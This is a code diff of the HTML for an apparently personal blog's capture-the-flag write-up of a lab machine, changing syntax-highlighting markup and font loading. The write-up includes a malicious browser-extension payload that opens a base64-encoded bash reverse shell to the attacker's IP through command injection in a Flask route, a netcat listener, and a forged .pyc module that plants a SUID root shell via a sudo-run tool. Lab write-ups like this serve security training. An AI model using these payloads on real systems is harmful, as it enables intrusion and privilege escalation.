@@ -14,7 +14,8 @@
 <link rel="icon" href="/assets/img/blackarch.svg" type="image/svg+xml">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Cantarell:wght@400;700&family=Fira+Code:wght@400;500;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&family=IBM+Plex+Sans:wght@400;600&display=swap" rel="stylesheet">
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Cantarell:wght@400;700&family=Fira+Code:wght@400;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&display=swap" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cantarell:wght@400;700&family=Fira+Code:wght@400;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&display=swap"></noscript>
 <link rel="stylesheet" href="/assets/css/os.css">
 <link rel="stylesheet" href="/assets/css/article.css">
 <link rel="stylesheet" href="/assets/css/blocks.css">
@@ -23,7 +24,12 @@
   var d = document.documentElement;
   d.className = d.className.replace('nojs', 'js');
   try {
-    if (localStorage.getItem('rc-body') === 'sans') d.setAttribute('data-body', 'sans');
+    if (localStorage.getItem('rc-body') === 'sans') {
+      d.setAttribute('data-body', 'sans');
+      var f = document.createElement('link'); f.id = 'font-sans'; f.rel = 'stylesheet';
+      f.href = 'https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;600&display=swap';
+      document.head.appendChild(f);
+    }
     var root = location.pathname === '/' || location.pathname === '/index.html';
     if (root && !sessionStorage.getItem('rc-booted') && !matchMedia('(prefers-reduced-motion: reduce)').matches) {
       d.classList.add('booting');
@@ -84,11 +90,11 @@
 <div class="wp-stage-body"><p>Only SSH and HTTP are up. The web app is an extension review platform — upload a <code>.zip</code>, their bot loads it in a headless Chrome and screenshots the result. The upload page even tells you the command line:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ curl -s http://10.129.244.79/upload.php
+<pre class="wp-term-body"><code class="hljs language-bash">$ curl -s http://10.129.244.79/upload.php
 ...
-timeout 10s xvfb-run /opt/chrome-linux64/chrome --disable-gpu --no-sandbox \
-  --load-extension=&quot;/tmp/extension_&lt;id&gt;&quot; --remote-debugging-port=0 \
-  --disable-extensions-except=&quot;/tmp/extension_&lt;id&gt;&quot; \
+<span class="hljs-built_in">timeout</span> 10s xvfb-run /opt/chrome-linux64/chrome --disable-gpu --no-sandbox \
+  --load-extension=<span class="hljs-string">&quot;/tmp/extension_&lt;id&gt;&quot;</span> --remote-debugging-port=0 \
+  --disable-extensions-except=<span class="hljs-string">&quot;/tmp/extension_&lt;id&gt;&quot;</span> \
   --enable-logging=stderr --v=1 \
   http://localhost/ http://browsedinternals.htb</code></pre>
 </div>
@@ -97,7 +103,7 @@ timeout 10s xvfb-run /opt/chrome-linux64/chrome --disable-gpu --no-sandbox \
 <p>Two target URLs. A throwaway extension that logs <code>navigator.userAgent</code> + <code>window.location</code> confirms the bot really visits <code>browsedinternals.htb</code>. Pin it in <code>/etc/hosts</code>:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ echo &quot;10.129.244.79 browsedinternals.htb browsed.htb&quot; | sudo tee -a /etc/hosts</code></pre>
+<pre class="wp-term-body"><code class="hljs language-bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.244.79 browsedinternals.htb browsed.htb&quot;</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts</code></pre>
 </div>
 
 
@@ -114,12 +120,12 @@ timeout 10s xvfb-run /opt/chrome-linux64/chrome --disable-gpu --no-sandbox \
 <div class="wp-stage-body"><p>Cloning the repo exposes a Flask helper and the shell script it wraps:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali · source review</span></div>
-<pre class="wp-term-body"><code class="language-python"># app.py
-@app.route(&#39;/routines/&lt;rid&gt;&#39;)
-def routines(rid):
-    result = subprocess.run([&quot;./routines.sh&quot;, rid],
-                            capture_output=True, text=True)
-    return f&quot;&lt;pre&gt;{result.stdout}{result.stderr}&lt;/pre&gt;&quot;</code></pre>
+<pre class="wp-term-body"><code class="hljs language-python"><span class="hljs-comment"># app.py</span>
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/routines/&lt;rid&gt;&#x27;</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">routines</span>(<span class="hljs-params">rid</span>):
+    result = subprocess.run([<span class="hljs-string">&quot;./routines.sh&quot;</span>, rid],
+                            capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>)
+    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;&lt;pre&gt;<span class="hljs-subst">{result.stdout}</span><span class="hljs-subst">{result.stderr}</span>&lt;/pre&gt;&quot;</span></code></pre>
 </div>
 
 
@@ -127,9 +133,9 @@ def routines(rid):
 
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · routines.sh</span></div>
-<pre class="wp-term-body"><code class="language-bash">if [[ &quot;$1&quot; -eq 0 ]]; then
+<pre class="wp-term-body"><code class="hljs language-bash"><span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> -eq 0 ]]; <span class="hljs-keyword">then</span>
     ...
-fi</code></pre>
+<span class="hljs-keyword">fi</span></code></pre>
 </div>
 
 
@@ -147,24 +153,24 @@ fi</code></pre>
 <div class="wp-stage-body"><p>A tiny extension with a background service worker fires a <code>fetch</code> to the vulnerable route on load:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · extension · background.js</span></div>
-<pre class="wp-term-body"><code class="language-javascript">const lhost = &quot;10.10.16.163&quot;;
-const lport = &quot;443&quot;;
-const cmd = `bash -c &#39;bash -i &gt;&amp; /dev/tcp/${lhost}/${lport} 0&gt;&amp;1&#39;`;
-const b64 = btoa(cmd);
-const payload = `arr[$(echo ${b64} | base64 -d | bash)]`;
+<pre class="wp-term-body"><code class="hljs language-javascript"><span class="hljs-keyword">const</span> lhost = <span class="hljs-string">&quot;10.10.16.163&quot;</span>;
+<span class="hljs-keyword">const</span> lport = <span class="hljs-string">&quot;443&quot;</span>;
+<span class="hljs-keyword">const</span> cmd = <span class="hljs-string">`bash -c &#x27;bash -i &gt;&amp; /dev/tcp/<span class="hljs-subst">${lhost}</span>/<span class="hljs-subst">${lport}</span> 0&gt;&amp;1&#x27;`</span>;
+<span class="hljs-keyword">const</span> b64 = <span class="hljs-title function_">btoa</span>(cmd);
+<span class="hljs-keyword">const</span> payload = <span class="hljs-string">`arr[$(echo <span class="hljs-subst">${b64}</span> | base64 -d | bash)]`</span>;
 
-fetch(`http://127.0.0.1:5000/routines/${encodeURIComponent(payload)}`,
-      { mode: &quot;no-cors&quot; });</code></pre>
+<span class="hljs-title function_">fetch</span>(<span class="hljs-string">`http://127.0.0.1:5000/routines/<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(payload)}</span>`</span>,
+      { <span class="hljs-attr">mode</span>: <span class="hljs-string">&quot;no-cors&quot;</span> });</code></pre>
 </div>
 
 
 <p>Zip it, upload, listen:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ zip -r pwnext.zip manifest.json background.js
+<pre class="wp-term-body"><code class="hljs language-bash">$ zip -r pwnext.zip manifest.json background.js
 $ nc -lvnp 443
 connect to [10.10.16.163] from (UNKNOWN) [10.129.244.79] 52994
-larry@browsed:~$ id
+larry@browsed:~$ <span class="hljs-built_in">id</span>
 uid=1000(larry) gid=1000(larry)</code></pre>
 </div>
 
@@ -182,11 +188,11 @@ uid=1000(larry) gid=1000(larry)</code></pre>
 <h2 class="wp-stage-title">larry&#39;s sudo line names the root-owned tool.</h2>
 <div class="wp-stage-body"><div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · larry@browsed</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ sudo -l
+<pre class="wp-term-body"><code class="hljs language-bash">$ sudo -l
 User larry may run:
     (root) NOPASSWD: /opt/extensiontool/extension_tool.py
 
-$ ls -la /opt/extensiontool
+$ <span class="hljs-built_in">ls</span> -la /opt/extensiontool
 -rwxr-xr-x  root root  extension_tool.py
 -rw-r--r--  root root  extension_utils.py
 drwxrwxrwx  root root  __pycache__          ← mode 777</code></pre>
@@ -206,33 +212,33 @@ drwxrwxrwx  root root  __pycache__          ← mode 777</code></pre>
 <div class="wp-stage-body"><p>Build a malicious module, compile it, patch the 16-byte Python 3.7+ header to mirror the real <code>extension_utils.py</code>. The payload module drops a SUID copy of <code>bash</code> into <code>/tmp/rootbash</code> when Python imports it:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · larry@browsed · pyc forge</span></div>
-<pre class="wp-term-body"><code class="language-python">import os, struct, py_compile
+<pre class="wp-term-body"><code class="hljs language-python"><span class="hljs-keyword">import</span> os, struct, py_compile
 
-target = &#39;/opt/extensiontool/extension_utils.py&#39;
-cache  = &#39;/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc&#39;
+target = <span class="hljs-string">&#x27;/opt/extensiontool/extension_utils.py&#x27;</span>
+cache  = <span class="hljs-string">&#x27;/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc&#x27;</span>
 
 src = (
-    &quot;import subprocess\n&quot;
-    &quot;\n&quot;
-    &quot;def validate_manifest(path):\n&quot;
-    &quot;    return {&#39;version&#39;:&#39;0.0.1&#39;,&#39;manifest_version&#39;:3,&#39;name&#39;:&#39;x&#39;}\n&quot;
-    &quot;\n&quot;
-    &quot;def clean_temp_files(arg):\n&quot;
-    &quot;    subprocess.run([&#39;cp&#39;,&#39;/bin/bash&#39;,&#39;/tmp/rootbash&#39;])\n&quot;
-    &quot;    subprocess.run([&#39;chmod&#39;,&#39;4777&#39;,&#39;/tmp/rootbash&#39;])\n&quot;
+    <span class="hljs-string">&quot;import subprocess\n&quot;</span>
+    <span class="hljs-string">&quot;\n&quot;</span>
+    <span class="hljs-string">&quot;def validate_manifest(path):\n&quot;</span>
+    <span class="hljs-string">&quot;    return {&#x27;version&#x27;:&#x27;0.0.1&#x27;,&#x27;manifest_version&#x27;:3,&#x27;name&#x27;:&#x27;x&#x27;}\n&quot;</span>
+    <span class="hljs-string">&quot;\n&quot;</span>
+    <span class="hljs-string">&quot;def clean_temp_files(arg):\n&quot;</span>
+    <span class="hljs-string">&quot;    subprocess.run([&#x27;cp&#x27;,&#x27;/bin/bash&#x27;,&#x27;/tmp/rootbash&#x27;])\n&quot;</span>
+    <span class="hljs-string">&quot;    subprocess.run([&#x27;chmod&#x27;,&#x27;4777&#x27;,&#x27;/tmp/rootbash&#x27;])\n&quot;</span>
 )
-with open(&#39;/tmp/extension_utils.py&#39;,&#39;w&#39;) as f:
+<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/tmp/extension_utils.py&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:
     f.write(src)
 
-py_compile.compile(&#39;/tmp/extension_utils.py&#39;, cfile=&#39;/tmp/payload.pyc&#39;)
+py_compile.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;/tmp/extension_utils.py&#x27;</span>, cfile=<span class="hljs-string">&#x27;/tmp/payload.pyc&#x27;</span>)
 st = os.stat(target)
 
-with open(&#39;/tmp/payload.pyc&#39;,&#39;rb&#39;) as f:
-    data = bytearray(f.read())
-struct.pack_into(&#39;&lt;I&#39;, data, 8,  int(st.st_mtime))
-struct.pack_into(&#39;&lt;I&#39;, data, 12, st.st_size)
+<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/tmp/payload.pyc&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:
+    data = <span class="hljs-built_in">bytearray</span>(f.read())
+struct.pack_into(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, data, <span class="hljs-number">8</span>,  <span class="hljs-built_in">int</span>(st.st_mtime))
+struct.pack_into(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, data, <span class="hljs-number">12</span>, st.st_size)
 
-with open(cache,&#39;wb&#39;) as f:
+<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(cache,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:
     f.write(data)</code></pre>
 </div>
 
@@ -240,11 +246,11 @@ with open(cache,&#39;wb&#39;) as f:
 <p>Trigger it and collect:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · larry@browsed</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ sudo /opt/extensiontool/extension_tool.py --clean
+<pre class="wp-term-body"><code class="hljs language-bash">$ sudo /opt/extensiontool/extension_tool.py --clean
 $ /tmp/rootbash -p
-# id
+<span class="hljs-comment"># id</span>
 uid=1000(larry) gid=1000(larry) euid=0(root)
-# cat /root/root.txt</code></pre>
+<span class="hljs-comment"># cat /root/root.txt</span></code></pre>
 </div>
 
 
@@ -276,9 +282,6 @@ uid=1000(larry) gid=1000(larry) euid=0(root)
   </section>
 </main>
 <footer class="nojs-foot">© 2026 Will DeDominico · <a href="https://github.com/Moriz82">GitHub</a> · <a href="https://www.linkedin.com/in/wdedo/">LinkedIn</a></footer>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js" defer></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js" defer></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/swift.min.js" defer></script>
 <script type="module" src="/assets/js/os/main.js"></script>
 </body>
 </html>
